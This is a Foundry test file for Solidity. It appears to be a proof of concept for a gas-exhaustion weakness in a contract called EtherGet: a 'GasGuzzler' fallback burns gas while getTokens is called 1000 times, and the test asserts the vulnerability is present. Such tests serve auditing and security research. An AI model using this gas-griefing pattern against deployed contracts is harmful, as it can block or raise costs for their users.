// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x52d2e0f9b01101a59b38a3d05c80b7618aeed984.sol";

contract GasGuzzler {
    fallback() external payable {
        uint256[10] memory data;
        for (uint i = 0; i < 50; i++) {
            data[i % 10] = i + uint256(block.prevrandao);
        }
    }
}

contract EtherGetTest is Test {
    EtherGet public etherGet;
    GasGuzzler public gasGuzzler;

    function setUp() public {
        etherGet = new EtherGet();
        gasGuzzler = new GasGuzzler();
    }

    function testGetTokensGasOverflow() public {
        uint256 highNum = 1000;
        uint256 minExpectedGas = 20000 * highNum; // 1000 calls * 20k gas

        console.log("--- BEFORE-Trigger ---");
        uint256 gasBefore = gasleft();
        console.log("Gas available before call:", gasBefore);

        console.log("--- Trigger ---");
        // Perform the highNum calls to getTokens
        etherGet.getTokens(highNum, address(gasGuzzler));

        console.log("--- AFTER-Trigger ---");
        uint256 gasAfter = gasleft();
        uint256 gasUsed = gasBefore - gasAfter;
        console.log("Gas consumed by operation:", gasUsed);
        console.log("Minimum dangerous gas threshold:", minExpectedGas);

        // Vulnerability verification
        bool vulnerabilityExists = gasUsed > minExpectedGas;
        if (vulnerabilityExists) {
            console.log("VULNERABLE: Gas consumption exceeds dangerous levels");
        } else {
            console.log("SAFE: Gas consumption within safe parameters");
        }

        // Maintain original assertion for test framework
        assertTrue(
            vulnerabilityExists,
            "Gas consumption didn't reach dangerous levels"
        );
    }
}